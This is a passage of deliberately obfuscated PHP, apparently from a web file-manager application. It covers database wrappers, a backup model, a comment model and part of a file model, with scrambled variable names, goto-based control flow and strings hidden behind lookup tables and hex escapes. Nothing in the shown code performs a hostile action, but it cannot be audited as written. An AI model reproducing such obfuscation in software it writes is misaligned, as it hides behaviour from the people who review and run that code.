. $FÆ¡»Åİ¡¿[0] . $aõƒôŞ¬¯[60]; } else { $cÂÇ®ª–Û .= $aõƒôŞ¬¯[58] . $FÆ¡»Åİ¡¿[0] . $aõƒôŞ¬¯[60]; } break; case $aõƒôŞ¬¯[835]: case $aõƒôŞ¬¯[853]: break; case $aõƒôŞ¬¯[837]: break; case $aõƒôŞ¬¯[836]: case $aõƒôŞ¬¯[838]: break; case $aõƒôŞ¬¯[865]: default: $cÂÇ®ª–Û .= $aõƒôŞ¬¯[58] . $FÆ¡»Åİ¡¿ . $aõƒôŞ¬¯[60]; } } return $cÂÇ®ª–Û; } public function parseKey(&$c·ôÑÜÍ„, $CòÅÓÂÒí = true) { $fÚ†ƒŸ×ç‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($CòÅÓÂÒí) { $c·ôÑÜÍ„ = $this->parseKeyCheck($c·ôÑÜÍ„); } if ($this->dbType == $fÚ†ƒŸ×ç‘[865]) { if ($c·ôÑÜÍ„ != $fÚ†ƒŸ×ç‘[186] && !preg_match($fÚ†ƒŸ×ç‘[829], $c·ôÑÜÍ„)) { $c·ôÑÜÍ„ = $fÚ†ƒŸ×ç‘[830] . trim($c·ôÑÜÍ„, $fÚ†ƒŸ×ç‘[830]) . $fÚ†ƒŸ×ç‘[830]; } return $c·ôÑÜÍ„; } else { return parent::parseKey($c·ôÑÜÍ„); } } public function close() { $this->_linkID = null; } public function error() { $AŠçáŠÆ“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->PDOStatement) { $Cš› ºÚ™· = $this->PDOStatement->errorInfo(); $this->error = $Cš› ºÚ™·[1] . $AŠçáŠÆ“[4] . $Cš› ºÚ™·[2]; } else { $this->error = $AŠçáŠÆ“[43]; } if ($AŠçáŠÆ“[43] != $this->queryStr) { $this->error .= LNG($AŠçáŠÆ“[55]) . $this->queryStr; } think_trace($this->error, $AŠçáŠÆ“[43], $AŠçáŠÆ“[56]); return $this->error; } public function escapeString($bòöÅéÈ—) { $aÂĞÍğ² =& $_SERVER[çŞáÓæÚô‚Ô‡]; switch ($this->dbType) { case $aÂĞÍğ²[862]: case $aÂĞÍğ²[835]: case $aÂĞÍğ²[853]: case $aÂĞÍğ²[865]: return addslashes($bòöÅéÈ—); case $aÂĞÍğ²[837]: case $aÂĞÍğ²[854]: case $aÂĞÍğ²[836]: case $aÂĞÍğ²[838]: return str_ireplace($aÂĞÍğ²[65], $aÂĞÍğ²[66], $bòöÅéÈ—); } } protected function parseValue($aİ»£·ÃÊ‰) { $D‹Í…Óøšâ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_string($aİ»£·ÃÊ‰)) { $aİ»£·ÃÊ‰ = strpos($aİ»£·ÃÊ‰, $D‹Í…Óøšâ[4]) === 0 ? $this->escapeString($aİ»£·ÃÊ‰) : $D‹Í…Óøšâ[875] . $this->escapeString($aİ»£·ÃÊ‰) . $D‹Í…Óøšâ[875]; } elseif (isset($aİ»£·ÃÊ‰[0]) && is_string($aİ»£·ÃÊ‰[0]) && strtolower($aİ»£·ÃÊ‰[0]) == $D‹Í…Óøšâ[294]) { $aİ»£·ÃÊ‰ = $this->escapeString($aİ»£·ÃÊ‰[1]); } elseif (is_array($aİ»£·ÃÊ‰)) { $aİ»£·ÃÊ‰ = array_map(array($this, $D‹Í…Óøšâ[876]), $aİ»£·ÃÊ‰); } elseif (is_bool($aİ»£·ÃÊ‰)) { $aİ»£·ÃÊ‰ = $aİ»£·ÃÊ‰ ? $D‹Í…Óøšâ[93] : $D‹Í…Óøšâ[479]; } elseif (is_null($aİ»£·ÃÊ‰)) { $aİ»£·ÃÊ‰ = $D‹Í…Óøšâ[109]; } return $aİ»£·ÃÊ‰; } public function getLastInsertId() { $c÷©Çá¾Ğ± =& $_SERVER[çŞáÓæÚô‚Ô‡]; switch ($this->dbType) { case $c÷©Çá¾Ğ±[862]: case $c÷©Çá¾Ğ±[854]: case $c÷©Çá¾Ğ±[835]: case $c÷©Çá¾Ğ±[853]: case $c÷©Çá¾Ğ±[837]: case $c÷©Çá¾Ğ±[865]: return $this->_linkID->lastInsertId(); case $c÷©Çá¾Ğ±[836]: case $c÷©Çá¾Ğ±[838]: $fãËª¾²ª¢ = $this->table; $D©ó“ÍïÜÔ = $this->query("\x53\105\x4c\105\103\124\40{$fãËª¾²ª¢}\x2e\x63\x75\162\x72\166\141\x6c\40\143\x75\x72\162\x76\141\x6c\x20\x46\122\117\115\x20\x64\x75\x61\154"); return $D©ó“ÍïÜÔ ? $D©ó“ÍïÜÔ[0][$c÷©Çá¾Ğ±[877]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($D²·Å•ïÀè) { goto a™ÜóÁïÒ–; a™ÜóÁïÒ–: $F†˜«Š•¶“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BšÅÖÉï›å = DATA_PATH . $F†˜«Š•¶“[878]; $AÕß§Õ¦‹º = fopen($BšÅÖÉï›å, $F†˜«Š•¶“[879]); goto d…ëÊ«²ƒ¯; e˜È‰²£®â: fclose($AÕß§Õ¦‹º); show_json($F†˜«Š•¶“[880], !1); return !1; goto fìÂ¿‰õ®î; d…ëÊ«²ƒ¯: if (!$AÕß§Õ¦‹º) { return !1; } if (flock($AÕß§Õ¦‹º, LOCK_EX)) { $F´‰¹àº‡Ï = parent::query($D²·Å•ïÀè); flock($AÕß§Õ¦‹º, LOCK_UN); fclose($AÕß§Õ¦‹º); return $F´‰¹àº‡Ï; } flock($AÕß§Õ¦‹º, LOCK_UN); goto e˜È‰²£®â; fìÂ¿‰õ®î: } public function execute($e—¨‡ğÖ) { goto A»ò‚ÌóÉ†; A»ò‚ÌóÉ†: $Bò¨ØƒÛŸÎ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B¾Ó«×â‡¦ = DATA_PATH . $Bò¨ØƒÛŸÎ[878]; $CêÊ™…Û™Ä = fopen($B¾Ó«×â‡¦, $Bò¨ØƒÛŸÎ[879]); goto bËö„ï¡‚; bËö„ï¡‚: if (!$CêÊ™…Û™Ä) { return !1; } if (flock($CêÊ™…Û™Ä, LOCK_EX)) { $BÑ„æ¾Ì¢Å = parent::execute($e—¨‡ğÖ); flock($CêÊ™…Û™Ä, LOCK_UN); fclose($CêÊ™…Û™Ä); return $BÑ„æ¾Ì¢Å; } flock($CêÊ™…Û™Ä, LOCK_UN); goto b…ÚçŞçã¦; b…ÚçŞçã¦: fclose($CêÊ™…Û™Ä); show_json($Bò¨ØƒÛŸÎ[880], !1); return !1; goto e©¢Öö„»; e©¢Öö„»: } } class DbSqlite3 extends DbSqlite3Base { public function query($aÁ„ÍäÉ¿°) { goto EÃ¹ã°Ñó¡; EÃ¹ã°Ñó¡: $eİÌ™ëÕ¬Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aİæˆ­ÔÒ¦ = DATA_PATH . $eİÌ™ëÕ¬Õ[878]; $e‡æÈ·Ô = fopen($aİæˆ­ÔÒ¦, $eİÌ™ëÕ¬Õ[879]); goto B–ÌÀÜ³œì; B–ÌÀÜ³œì: if (!$e‡æÈ·Ô) { return !1; } if (flock($e‡æÈ·Ô, LOCK_EX)) { $eÌ‹Ñë¨…‡ = parent::query($aÁ„ÍäÉ¿°); flock($e‡æÈ·Ô, LOCK_UN); fclose($e‡æÈ·Ô); return $eÌ‹Ñë¨…‡; } flock($e‡æÈ·Ô, LOCK_UN); goto cŠ’Üî»†»; cŠ’Üî»†»: fclose($e‡æÈ·Ô); show_json($eİÌ™ëÕ¬Õ[880], !1); return !1; goto B™£ğ²ÂÓ©; B™£ğ²ÂÓ©: } public function execute($eàˆ…äç¡½) { goto FµèÑÆä®Œ; Dïì¼ÃôÔ­: fclose($DãŠÍÀéì); show_json($dØñ‘ê´ÖÇ[880], !1); return !1; goto bâ’ëÆ²„‘; aµ•‚âóó¬: if (!$DãŠÍÀéì) { return !1; } if (flock($DãŠÍÀéì, LOCK_EX)) { $e¶À÷Î´²İ = parent::execute($eàˆ…äç¡½); flock($DãŠÍÀéì, LOCK_UN); fclose($DãŠÍÀéì); return $e¶À÷Î´²İ; } flock($DãŠÍÀéì, LOCK_UN); goto Dïì¼ÃôÔ­; FµèÑÆä®Œ: $dØñ‘ê´ÖÇ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¬ÚÛ¨Å»‘ = DATA_PATH . $dØñ‘ê´ÖÇ[878]; $DãŠÍÀéì = fopen($D¬ÚÛ¨Å»‘, $dØñ‘ê´ÖÇ[879]); goto aµ•‚âóó¬; bâ’ëÆ²„‘: } } goto bÛËÔª‰˜; a•â‘â·: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\142\141\x63\x6b\165\160\114\x69\x73\x74"; public $field = array("\151\x6f", "\156\x61\x6d\x65", "\163\x74\141\164\165\x73", "\x63\157\156\x74\145\156\x74", "\162\145\163\x75\x6c\x74", "\x74\151\155\145\x46\x72\157\155", "\164\x69\x6d\145\x54\x6f"); public function config() { goto d†»‚ïŒå; Dçƒ¤½øÏ™: if (isset($fÍŠ™ŠÇ ¹[$Fˆ‘¨³×‰Í[200]])) { $fÍŠ™ŠÇ ¹[$Fˆ‘¨³×‰Í[200]] = json_decode($fÍŠ™ŠÇ ¹[$Fˆ‘¨³×‰Í[200]], !0); } if (isset($a”ÁÓ¹‡ÇŒ[$Fˆ‘¨³×‰Í[200]])) { $fÍŠ™ŠÇ ¹[$Fˆ‘¨³×‰Í[200]][$Fˆ‘¨³×‰Í[1418]] = $a”ÁÓ¹‡ÇŒ[$Fˆ‘¨³×‰Í[200]]; unset($a”ÁÓ¹‡ÇŒ[$Fˆ‘¨³×‰Í[200]]); } return array_merge($fÍŠ™ŠÇ ¹, $a”ÁÓ¹‡ÇŒ); goto CŒ…åóö; cäÙ†¸§Ù: $a”ÁÓ¹‡ÇŒ = is_array($a”ÁÓ¹‡ÇŒ) ? $a”ÁÓ¹‡ÇŒ : array(); if (!isset($a”ÁÓ¹‡ÇŒ[$Fˆ‘¨³×‰Í[701]])) { $a”ÁÓ¹‡ÇŒ[$Fˆ‘¨³×‰Í[701]] = $Fˆ‘¨³×‰Í[93]; } $fÍŠ™ŠÇ ¹ = array(); goto BçÕ­”’¥£; BçÕ­”’¥£: Action($Fˆ‘¨³×‰Í[2137])->taskInit(); $eÄÏË«åÖ¶ = Model($Fˆ‘¨³×‰Í[2138])->listData(); foreach ($eÄÏË«åÖ¶ as $A¡¦…ğ¥˜Æ) { if ($A¡¦…ğ¥˜Æ[$Fˆ‘¨³×‰Í[1087]] == $Fˆ‘¨³×‰Í[93] && $A¡¦…ğ¥˜Æ[$Fˆ‘¨³×‰Í[1431]] == $Fˆ‘¨³×‰Í[2139]) { $fÍŠ™ŠÇ ¹ = $A¡¦…ğ¥˜Æ; break; } } goto Dçƒ¤½øÏ™; d†»‚ïŒå: $Fˆ‘¨³×‰Í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a”ÁÓ¹‡ÇŒ = Model($Fˆ‘¨³×‰Í[1095])->get($Fˆ‘¨³×‰Í[722]); $a”ÁÓ¹‡ÇŒ = json_decode($a”ÁÓ¹‡ÇŒ, !0); goto cäÙ†¸§Ù; CŒ…åóö: } public function listData($b¤’õÍÒ« = false, $f“ÖŒÉˆìÁ = "\155\157\x64\x69\146\171\x54\151\x6d\x65", $dé£Ìİ‚Œ = false) { return parent::listData($b¤’õÍÒ«, $f“ÖŒÉˆìÁ, !0); } public function lastItem() { $b½‰¡¡¥ = $this->listData(); return !empty($b½‰¡¡¥[0]) ? $b½‰¡¡¥[0] : null; } public function kill($CËğ¢°áÍ›) { goto e‘¿ÎÃºÂ; F„¦÷Î†²Û: $fµÜÏªµÚ¾ = $Eéø×Ü„œ§[$B†”±¶ÍŒî[38]]; $fÄÚœÉğìµ = TEMP_FILES . $B†”±¶ÍŒî[718] . $fµÜÏªµÚ¾ . $B†”±¶ÍŒî[18]; IO::remove($fÄÚœÉğìµ, !1); goto aÛÈæ…‹Î•; aÛÈæ…‹Î•: return $this->remove($CËğ¢°áÍ›); goto Eù•»…‚Ï; e”¿âœÙ¾â: Task::kill($B†”±¶ÍŒî[721]); Task::kill($B†”±¶ÍŒî[737]); Task::kill($B†”±¶ÍŒî[745]); goto F„¦÷Î†²Û; e‘¿ÎÃºÂ: $B†”±¶ÍŒî =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eéø×Ü„œ§ = $this->listData($CËğ¢°áÍ›); if (!$Eéø×Ü„œ§ || empty($Eéø×Ü„œ§[$B†”±¶ÍŒî[38]])) { return !0; } goto e”¿âœÙ¾â; Eù•»…‚Ï: } public function remove($Eæ—« ˆò) { $F†÷ï¦Ù¬İ = $this->listData($Eæ—« ˆò); if (!$F†÷ï¦Ù¬İ) { return !0; } return $this->backupRemove($F†÷ï¦Ù¬İ); } private function backupRemove($B®é¥¶áÖ) { $B§¹ùÇ©æ… =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::remove($B®é¥¶áÖ[$B§¹ùÇ©æ…[376]]); $a­…Õ°ó”± = "\x7b\151\157\72{$B®é¥¶áÖ[$B§¹ùÇ©æ…[700]]}\175\x2f\144\141\164\141\142\x61\163\145\x2f\142\x61\143\153\165\x70\x5f" . $B®é¥¶áÖ[$B§¹ùÇ©æ…[38]]; IO::remove($a­…Õ°ó”±, !1); return !0; } public function start() { goto fÓ£‘¡øë; D—ÜïˆÃÆ: if (!$f‚é ¹ª->dbFile()) { return !1; } if ($CáÁ‹ÅŠÖ[$A›ìíåÂö»[701]] == $A›ìíåÂö»[479]) { $f‚é ¹ª->file(); } Backup::set(array($A›ìíåÂö»[698] => 1, $A›ìíåÂö»[458] => time())); goto f˜¿™õå‘‰; fÓ£‘¡øë: $A›ìíåÂö» =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($GLOBALS[$A›ìíåÂö»[16]][$A›ìíåÂö»[94]][$A›ìíåÂö»[2140]] != $A›ìíåÂö»[93]) { return !0; } $CáÁ‹ÅŠÖ = $this->config(); goto aèï‹ö»; aèï‹ö»: if (!$CáÁ‹ÅŠÖ || $CáÁ‹ÅŠÖ[$A›ìíåÂö»[1415]] != $A›ìíåÂö»[93]) { return !1; } $fâì¤Ïˆª³ = $this->process(); foreach ($fâì¤Ïˆª³ as $a‘ğ´‡´Ì) { if ($a‘ğ´‡´Ì) { return Task::restart($a‘ğ´‡´Ì[$A›ìíåÂö»[376]]); } } goto B‚ÕÙìÌÈ; f˜¿™õå‘‰: return !0; goto BİÂ–¸éŸ†; B‚ÕÙìÌÈ: $f‚é ¹ª = new Backup(); $f‚é ¹ª->keep(); if (!$f‚é ¹ª->db()) { return !1; } goto D—ÜïˆÃÆ; BİÂ–¸éŸ†: } public function process() { $E’Ò‹•ĞŒ‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($E’Ò‹•ĞŒ‘[703] => Task::get($E’Ò‹•ĞŒ‘[721]), $E’Ò‹•ĞŒ‘[706] => Task::get($E’Ò‹•ĞŒ‘[737]), $E’Ò‹•ĞŒ‘[177] => Task::get($E’Ò‹•ĞŒ‘[745])); } public function restore() { $aËàšŒÜ»Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; ActionCall($aËàšŒÜ»Ï[980], !0, 1); ActionCall($aËàšŒÜ»Ï[980], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\x65" => "\143\157\x6d\x6d\145\156\x74\137\x6d\145\x74\141", "\x6d\x65\x74\x61\x46\151\x65\154\x64" => "\x63\x6f\x6d\x6d\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Aî¼ÏÉïƒ…) { $eèÊ¤½§Œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[2141]]) { $CÅÉğ¾¿¸ = $this->where(array($eèÊ¤½§Œ[2142] => $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[2141]]))->find(); if (!$CÅÉğ¾¿¸ || $CÅÉğ¾¿¸[$eèÊ¤½§Œ[380]] != $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[380]] || $CÅÉğ¾¿¸[$eèÊ¤½§Œ[467]] != $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[467]]) { return !1; } $this->where(array($eèÊ¤½§Œ[2142] => $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[2141]]))->setAdd($eèÊ¤½§Œ[2143], 1); } $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[2144]] = 0; $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[2143]] = 0; $Aî¼ÏÉïƒ…[$eèÊ¤½§Œ[698]] = 1; return $this->add($Aî¼ÏÉïƒ…); } public function remove($e´Ÿà¯Œğó) { $B†±åÎÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b–ê˜›àî = array($B†±åÎÀ[2142] => $e´Ÿà¯Œğó); $CğÜß½ƒ‹ = $this->where($b–ê˜›àî)->find(); if ($CğÜß½ƒ‹[$B†±åÎÀ[2141]]) { $this->where(array($B†±åÎÀ[2142] => $CğÜß½ƒ‹[$B†±åÎÀ[2141]]))->setAdd($B†±åÎÀ[2143], -1); } return $this->where($b–ê˜›àî)->delete(); } public function edit($C …Æç¦Ãç, $C®¿èªÆ”Ä) { $E†”–³‘¨¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÏÙ‚¡¥ƒå = array($E†”–³‘¨¯[2142] => $C …Æç¦Ãç); return $this->where($dÏÙ‚¡¥ƒå)->save(array($E†”–³‘¨¯[2145] => $C®¿èªÆ”Ä)); } public function prasise($B‹ÂºÂ³›‡) { $Aë†‡Ó¼‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b™Êñä‡Æ³ = Model($Aë†‡Ó¼‚[2146]); $aÎ–äá§§ñ = array($Aë†‡Ó¼‚[2142] => $B‹ÂºÂ³›‡, $Aë†‡Ó¼‚[1434] => USER_ID); $C‡§ÑŞ¸È = $b™Êñä‡Æ³->where($aÎ–äá§§ñ)->find(); if (!$C‡§ÑŞ¸È) { $b™Êñä‡Æ³->add($aÎ–äá§§ñ); $EË¾¢ÕãÊ = $this->where(array($Aë†‡Ó¼‚[2142] => $B‹ÂºÂ³›‡))->setAdd($Aë†‡Ó¼‚[2144], 1); } else { $b™Êñä‡Æ³->where($aÎ–äá§§ñ)->delete(); $EË¾¢ÕãÊ = $this->where(array($Aë†‡Ó¼‚[2142] => $B‹ÂºÂ³›‡))->setAdd($Aë†‡Ó¼‚[2144], -1); } return $EË¾¢ÕãÊ; } public function targetInfo($d®»÷”Ã­÷, $DÇãëµÏ÷Æ) { goto eŠ‚ŸçÃ»À; e¤ªàÖ•¨°: $c÷öï‡¤äî = "\122\x49\x47\x48\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\143\157\x6d\x6d\x65\x6e\164\x5f\x70\162\x61\x69\x73\x65\x20\x73\164\x61\162\40\x6f\x6e\40\143\x6f\x6d\155\145\x6e\164\56\x63\x6f\x6d\155\145\x6e\x74\111\104\40\x3d\x20\x73\x74\x61\162\x2e\143\x6f\155\155\145\156\x74\x49\104"; $b˜Ù‰¹¸„ø = $this->alias($cÖ‘Ã‹«ÙÑ[350])->where($eÌÁ¸à²Í)->join($c÷öï‡¤äî, $cÖ‘Ã‹«ÙÑ[2147])->count(); $E·ÇÕ˜ìˆµ = array($cÖ‘Ã‹«ÙÑ[2148] => $c·ÍË¾¬ä, $cÖ‘Ã‹«ÙÑ[2149] => $b˜Ù‰¹¸„ø); goto b ®ÈìĞ¦Ü; eŠ‚ŸçÃ»À: $cÖ‘Ã‹«ÙÑ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÌÁ¸à²Í = array($cÖ‘Ã‹«ÙÑ[532] => $d®»÷”Ã­÷, $cÖ‘Ã‹«ÙÑ[533] => $DÇãëµÏ÷Æ); $c·ÍË¾¬ä = $this->where($eÌÁ¸à²Í)->count(); goto e¤ªàÖ•¨°; b ®ÈìĞ¦Ü: return $E·ÇÕ˜ìˆµ; goto F«ŠöÓ¨Í›; F«ŠöÓ¨Í›: } public function listData($dåÂ¿—°²Æ) { $C¦Şˆ£¦°ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2150]])) { if ($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2150]]) { $dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2151]] = array($C¦Şˆ£¦°ã[934], intval($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2150]])); } unset($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2150]]); } if (isset($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2152]])) { if ($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2152]]) { $dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2151]] = array($C¦Şˆ£¦°ã[931], intval($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2152]])); } unset($dåÂ¿—°²Æ[$C¦Şˆ£¦°ã[2152]]); } return $this->_listData($dåÂ¿—°²Æ); } private function _listData($bÅÎÏÉß¨¹) { $D· œ‹Ÿ½À =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D§Á•Œƒ£« = $this->where($bÅÎÏÉß¨¹)->_makeOrder()->selectPage(100); $this->_listAppendParent($D§Á•Œƒ£«[$D· œ‹Ÿ½À[363]]); $this->_listAppendUser($D§Á•Œƒ£«[$D· œ‹Ÿ½À[363]]); $this->_listAppendMeta($D§Á•Œƒ£«[$D· œ‹Ÿ½À[363]]); return $D§Á•Œƒ£«; } private function _makeOrder() { $eí„è‘Œ‚À =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¡ÕéÎ§­ = array($eí„è‘Œ‚À[2144], $eí„è‘Œ‚À[2143], $eí„è‘Œ‚À[197]); $A˜¢ƒìõô = Input::get($eí„è‘Œ‚À[416], $eí„è‘Œ‚À[17], $eí„è‘Œ‚À[398], $A¡ÕéÎ§­); $eàÛÅÙ˜äÍ = Input::get($eí„è‘Œ‚À[417], $eí„è‘Œ‚À[17], $eí„è‘Œ‚À[1436], array($eí„è‘Œ‚À[2153], $eí„è‘Œ‚À[414])); $F“âõœ×Á— = $A˜¢ƒìõô . $eí„è‘Œ‚À[60] . $eàÛÅÙ˜äÍ; return $this->order($F“âõœ×Á—); } private function _listAppendParent(&$Fä¡ø—õˆƒ) { goto fõïõ¶£«Ï; D§˜«Ãµ‹İ: foreach ($Fä¡ø—õˆƒ as &$fÚÃêíŠ„–) { if (isset($e½¬È½Å¿–[$fÚÃêíŠ„–[$aÑù‰Ò¿Ç[2141]]])) { $fÚÃêíŠ„–[$aÑù‰Ò¿Ç[2154]] = $e½¬È½Å¿–[$fÚÃêíŠ„–[$aÑù‰Ò¿Ç[2141]]]; } } unset($fÚÃêíŠ„–); goto fÄ‰ÏÇÖÃö; fõïõ¶£«Ï: $aÑù‰Ò¿Ç =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÖÏêŠ¨¸Š = array_unique(array_to_keyvalue($Fä¡ø—õˆƒ, $aÑù‰Ò¿Ç[43], $aÑù‰Ò¿Ç[2141])); $dÖÏêŠ¨¸Š = array_remove_value($dÖÏêŠ¨¸Š, $aÑù‰Ò¿Ç[479]); goto AêÕÁº–Ó¨; AêÕÁº–Ó¨: if (!$dÖÏêŠ¨¸Š) { return; } $e½¬È½Å¿– = $this->where(array($aÑù‰Ò¿Ç[2142] => array($aÑù‰Ò¿Ç[17], $dÖÏêŠ¨¸Š)))->select(); $e½¬È½Å¿– = array_to_keyvalue($e½¬È½Å¿–, $aÑù‰Ò¿Ç[2151]); goto D§˜«Ãµ‹İ; fÄ‰ÏÇÖÃö: } private function _listAppendUser(&$EÆğ¢‘ƒğÅ) { goto Ašæ™èÔÀë; eˆçè” ª: foreach ($EÆğ¢‘ƒğÅ as &$F£Äª¨) { $F£Äª¨[$eè²ù˜Û“ˆ[546]] = $E³ïÏ„®Ñ[$F£Äª¨[$eè²ù˜Û“ˆ[1443]]]; if (isset($F£Äª¨[$eè²ù˜Û“ˆ[2154]])) { $F£Äª¨[$eè²ù˜Û“ˆ[2154]][$eè²ù˜Û“ˆ[546]] = $E³ïÏ„®Ñ[$F£Äª¨[$eè²ù˜Û“ˆ[2154]][$eè²ù˜Û“ˆ[1443]]]; } } unset($F£Äª¨); goto D‘Æ’‚ê‚À; Ašæ™èÔÀë: $eè²ù˜Û“ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B§Á‰ §ñÔ = array_unique(array_to_keyvalue($EÆğ¢‘ƒğÅ, $eè²ù˜Û“ˆ[43], $eè²ù˜Û“ˆ[1443])); $B§Á‰ §ñÔ = array_remove_value($B§Á‰ §ñÔ, $eè²ù˜Û“ˆ[479]); goto DÀ±Î¢¨ëÇ; DÀ±Î¢¨ëÇ: if (count($B§Á‰ §ñÔ) == 0) { return; } foreach ($EÆğ¢‘ƒğÅ as $F£Äª¨) { if (isset($F£Äª¨[$eè²ù˜Û“ˆ[2154]])) { $B§Á‰ §ñÔ[] = $F£Äª¨[$eè²ù˜Û“ˆ[2154]][$eè²ù˜Û“ˆ[1443]]; } } $E³ïÏ„®Ñ = Model($eè²ù˜Û“ˆ[488])->userListInfo($B§Á‰ §ñÔ); goto eˆçè” ª; D‘Æ’‚ê‚À: } private function _listAppendMeta(&$d™š˜¥‹‹) { goto còÇß½Ó¶¤; còÇß½Ó¶¤: $eƒ¨–ç–Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CËîõßìÅ = array_unique(array_to_keyvalue($d™š˜¥‹‹, $eƒ¨–ç–Ï[43], $eƒ¨–ç–Ï[2151])); $CËîõßìÅ = array_remove_value($CËîõßìÅ, $eƒ¨–ç–Ï[479]); goto bŠÌ¹ÆÂóÙ; a©«¼ˆ“ô˜: if (!$E‡–Âóôøö) { return !1; } foreach ($d™š˜¥‹‹ as &$BÃ×ŠÜ«ë¦) { $BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[426]] = $E‡–Âóôøö[$BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2151]]]; if (isset($BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2154]])) { $BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2154]][$eƒ¨–ç–Ï[426]] = $E‡–Âóôøö[$BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2154]][$eƒ¨–ç–Ï[2151]]]; } } unset($BÃ×ŠÜ«ë¦); goto C¾¾à¤¯Íë; bŠÌ¹ÆÂóÙ: if (!$CËîõßìÅ) { return; } foreach ($d™š˜¥‹‹ as $BÃ×ŠÜ«ë¦) { if (isset($BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2154]])) { $CËîõßìÅ[] = $BÃ×ŠÜ«ë¦[$eƒ¨–ç–Ï[2154]][$eƒ¨–ç–Ï[2151]]; } } $E‡–Âóôøö = $this->metaList($CËîõßìÅ); goto a©«¼ˆ“ô˜; C¾¾à¤¯Íë: } private function metaList($cÜøâÎñ) { goto c‚…ç çø‹; Cİ£Ãç¢”: return $dŸœ‘šºÊ ? $dŸœ‘šºÊ : array(); goto b•ìÃ×Ş‹; c‚…ç çø‹: $aİ‘íÚŠ±ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$cÜøâÎñ) { return array(); } $Bã¢ö…‘Ğ· = array($aİ‘íÚŠ±ã[2151] => array($aİ‘íÚŠ±ã[17], $cÜøâÎñ)); goto d”Ü‹¸›“ö; d”Ü‹¸›“ö: $dŸœ‘šºÊ = Model($aİ‘íÚŠ±ã[2155])->where($Bã¢ö…‘Ğ·)->select(); $dŸœ‘šºÊ = array_to_keyvalue_group($dŸœ‘šºÊ, $aİ‘íÚŠ±ã[2151]); foreach ($dŸœ‘šºÊ as $DÒŒëëÇˆ => $dŞÚÙë”Ğó) { $Céµ¢ƒİò¤ = array(); foreach ($dŞÚÙë”Ğó as $BÖ¹±”ÙÌä) { $Céµ¢ƒİò¤[$BÖ¹±”ÙÌä[$aİ‘íÚŠ±ã[99]]] = $BÖ¹±”ÙÌä[$aİ‘íÚŠ±ã[368]]; } $dŸœ‘šºÊ[$DÒŒëëÇˆ] = $Céµ¢ƒİò¤; } goto Cİ£Ãç¢”; b•ìÃ×Ş‹: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\164\141\x62\154\145\116\141\155\x65" => "\x69\x6f\137\146\151\154\145\137\155\x65\164\x61", "\155\145\x74\141\x46\x69\x65\154\x64" => "\146\x69\154\x65\111\104"); public function fileInfo($aÉŞÙóøêå) { $FóŞòÍä¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $C±ä†ƒĞîÉ = array(); if (!isset($C±ä†ƒĞîÉ[$aÉŞÙóøêå])) { $C§Úá–  = $FóŞòÍä¡[2156]; $a´ŒíÙ˜ïá = Model($FóŞòÍä¡[431])->field($C§Úá– )->where(array($FóŞòÍä¡[429] => $aÉŞÙóøêå))->find(); $C±ä†ƒĞîÉ[$aÉŞÙóøêå] = $a´ŒíÙ˜ïá; } return $C±ä†ƒĞîÉ[$aÉŞÙóøêå]; } public function addFileByContent($EÆÌŸ¸„˜» = '', 